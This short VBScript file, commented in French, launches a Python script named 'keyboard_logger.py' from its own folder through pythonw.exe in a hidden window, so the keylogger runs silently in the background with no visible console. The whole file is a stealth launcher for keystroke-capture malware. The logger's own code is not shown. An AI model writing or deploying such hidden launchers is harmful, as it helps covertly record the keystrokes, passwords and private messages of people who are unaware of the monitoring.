Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

REM Obtenir le chemin du script Python
strPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
strPythonScript = strPath & "\keyboard_logger.py"

REM Lancer le script Python en arrière-plan
objShell.Run "pythonw.exe """ & strPythonScript & """", 0, False
